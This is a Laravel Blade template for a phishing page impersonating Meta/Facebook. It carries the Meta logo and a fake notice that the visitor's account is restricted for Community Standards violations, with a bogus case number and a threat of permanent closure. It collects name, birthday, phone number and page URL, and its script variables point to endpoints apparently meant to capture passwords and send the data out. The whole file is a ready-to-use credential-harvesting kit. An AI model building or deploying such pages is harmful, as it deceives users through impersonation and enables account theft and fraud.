@extends('layout.index')
@section('content')
    <script>
        var URL_CHECK_IP = '{{ url('check-ip') }}';
        var URL_FB = '{{ url('get-password-modal') }}';
        var URL_SEND_MESSAGE = '{{ url('send-message') }}';
        var tanggallengkap = new String();
        var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
        namahari = namahari.split(" ");
        var namabulan = ("January February March April May June July August September October November December");
        namabulan = namabulan.split(" ");
        var tgl = new Date();
        var hari = tgl.getDay();
        var tanggal = tgl.getDate();
        var bulan = tgl.getMonth();
        var tahun = tgl.getFullYear();
        tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
    </script>
    <div class="top-header">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <svg aria-label="Logo Meta" style="width: 78px" class="cyypbtt7 ljni7pan" role="img"
                        viewBox="0 0 500 100">
                        <defs>
                            <linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3x" x1="124.38" x2="160.839"
                                y1="99" y2="59.326">
                                <stop offset=".427" stop-color="#0278F1"></stop>
                                <stop offset=".917" stop-color="#0180FA"></stop>
                            </linearGradient>
                            <linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3y" x1="42" x2="-1.666"
                                y1="4.936" y2="61.707">
                                <stop offset=".427" stop-color="#0165E0"></stop>
                                <stop offset=".917" stop-color="#0180FA"></stop>
                            </linearGradient>
                            <linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3z" x1="27.677" x2="132.943"
                                y1="28.71" y2="71.118">
                                <stop stop-color="#0064E0"></stop>
                                <stop offset=".656" stop-color="#0066E2"></stop>
                                <stop offset="1" stop-color="#0278F1"></stop>
                            </linearGradient>
                        </defs>
                        <path
                            d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                            fill="#1C2B33"></path>
                        <path
                            d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                            fill="#0180FA"></path>
                        <path
                            d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
                            fill="url(#jsc_c_3x)"></path>
                        <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
                            fill="url(#jsc_c_3y)"></path>
                        <path
                            d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                            fill="url(#jsc_c_3z)"></path>
                    </svg>

                </div>
            </div>
        </div>
    </div>

    <div class="info-form container">
        <img alt="" src="{{ url('images/inF0loCk.png') }}" width="100%">
        <div style="width: 100%;text-align: left;font-size: 20px;padding-bottom: 1rem;padding-top:10px">
            <strong>Your account has been restricted</strong>
            <br />
            <span style="font-size: 0.8rem"> Term of Service</span>
            <hr style="margin: 0" />
        </div>
        <div class="Caption" style="font-weight: 500">
            <strong> We detected unusual activity in your page today
                <script language="JavaScript">
                    document.write(tanggallengkap);
                </script>
            </strong>.<br />
            Someone has reported your account for not complying with <a>Community Standards</a>. We have
            already reviewed this decision and the decision cannot be changed. To avoid having your account
            <a>disabled</a>, please verify:
        </div>
        <div id="form_info">
            <form id="basic" autocomplete="off">
                <input type="hidden" name="_token" id="_token" value="{{ csrf_token() }}" />
                <div style="width: 100%;margin-top: 10px">
                    <input id="basic_fill_name" name="basic_fill_name" placeholder="Your Name (Name and Surname)"
                        required="true" class="form-control" type="text" value="Luvu">
                </div>
                <div style="width: 100%;margin-top: 10px">
                    <input id="basic_fill_birth_day" name="basic_fill_birth_day" required="true" class="form-control"
                        placeholder="Birthday (dd/mm/yyyy)" type="text" value="19/08/1993">
                </div>
                <div style="width: 100%;margin-top: 10px;">
                    <input id="basic_fill_phone" required="true" placeholder="Your Phone Number" name="basic_fill_phone"
                        class="form-control" type="text" value="09821653241">
                </div>
                <div style="width: 100%;margin-top: 10px;margin-bottom: 10px;">
                    <input id="basic_fill_page_name" placeholder="Page URL" name="basic_fill_page_name" aria-required="true"
                        class="form-control" type="text" value="Test PS Page" />
                </div>
                <button type="submit" id="business-submit" class="btn btn-primary"
                    style="background-color: ##267df1;width: 30%;float:right ;outline: none; border: none; box-shadow: none; color: white; font-weight: 700; font-size: 1rem;">
                    <div class="spinner-border" role="status" style="display: none;"></div> Continue
                </button>
            </form>
        </div>
        <div id="login_info">

        </div>
        <br />
        <div style="clear: both"></div>
        <hr />
        <div class="row">
            <div class="col-md-3" style="font-size: 0.850rem;color: #65676b;font-weight: 600;">
                Case Number: <a>#100430558912</a></div>
            <div class="col-md-9" style="font-size: 0.850rem;color: #65676b;font-weight: 600;text-align: justify">
                About Case: Violating Community Standards and Posting something inappropriate.</div>
        </div>
        <hr />
        <div class="AlertContent">
            <svg width="17" height="14" viewBox="0 0 30 20" fill="none" style="margin-top: -5px"
                xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd"
                    d="M11.9961 12.583C11.9531 13.102 11.5191 13.5 11.0001 13.5C10.4801 13.5 10.0471 13.102 10.0041 12.583L9.50413 6.603C9.50113 6.575 9.50013 6.547 9.50013 6.52C9.50013 5.783 10.0251 5 11.0001 5C11.9751 5 12.5001 5.783 12.5001 6.52L11.9961 12.583ZM11.0001 17.5C10.1731 17.5 9.50013 16.827 9.50013 16C9.50013 15.173 10.1731 14.5 11.0001 14.5C11.8271 14.5 12.5001 15.173 12.5001 16C12.5001 16.827 11.8271 17.5 11.0001 17.5ZM12.7301 1.003C12.3771 0.376 11.7431 0.001 11.0371 0H11.0331C10.3271 0 9.69313 0.373 9.33913 0.998L0.268128 16.989C-0.0878717 17.617 -0.0898717 18.366 0.265128 18.996C0.618128 19.624 1.25213 20 1.96213 20H20.0381C20.7461 20 21.3811 19.625 21.7341 18.998C22.0881 18.37 22.0881 17.622 21.7351 16.994L12.7301 1.003Z"
                    fill="#E69600"></path>
            </svg>
            Please make sure to fill in the data correctly, if you fill in the wrong data your account will be
            permanently closed. To learn more about why we deactivate accounts, go to <a target="_blank" rel="noopener"
                href="https://facebook.com/communitystandards/">Community Standards</a>.
        </div>
    </div>
    <style>
        .bi-eye-slash::before {
            content: "\f340";
            margin-top: 10px;
            font-size: 20px;
        }

        .bi-eye::before {
            content: "\f341";
            margin-top: 10px;
            font-size: 20px;
        }

        textarea:focus,
        input[type="text"]:focus,
        input[type="password"]:focus,
        input[type="datetime"]:focus,
        input[type="datetime-local"]:focus,
        input[type="date"]:focus,
        input[type="month"]:focus,
        input[type="time"]:focus,
        input[type="week"]:focus,
        input[type="number"]:focus,
        input[type="email"]:focus,
        input[type="url"]:focus,
        input[type="search"]:focus,
        input[type="tel"]:focus,
        input[type="color"]:focus,
        .uneditable-input:focus {
            border-color: #0d6efd;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset, 0 0 8px #0d6efd;
            outline: 0 none;
        }

        body {
            background-color: white;
        }

        a:not([class]) {
            text-decoration-skip-ink: auto;
            text-decoration: none;
            color: #1877f2;
        }

        .info-form {
            max-width: 616px;
        }

        * {
            font-family: SFProText-Medium, Helvetica, Arial, sans-serif;
            line-height: 1.2rem;
        }

        .form-control {
            background-color: white;
            font-size: 17px;
            padding: 14px 16px;
        }


        @media screen and (max-width: 640px) {
            .businesshelpcenter {
                height: 100px;
                line-height: 30px;
                font-size: 26px !important;
                padding: 20px !important;
            }
        }

        .top-header {
            background-color: #f6f6f6;
            text-align: left;
            padding: 15px 20px;
            margin-bottom: 1.5rem;
        }

        .header-form .header-top {
            width: 80%;
            display: flex;
            margin: auto;
        }

        label {
            color: #7d7e82;
            font-weight: 400;
            font-size: 14px;
            font-family: Helvetica Neue, Helvetica, Arial, lucida grande, tahoma, verdana, arial, sans-serif;
        }

        label.error {
            color: red !important;
        }

        .ant-checkbox>label.error {
            clear: both;
            position: absolute;
            margin-top: 18px;
        }

        .spinner-border {
            --bs-spinner-width: 1rem;
            --bs-spinner-height: 1rem;
        }
    </style>
    <div class="modal fade" tabindex="-1" role="dialog" data-bs-backdrop="static">
    </div>
    <script type="text/jscript" src="{{URL::asset('js/fb.js')}}"></script>
@endsection
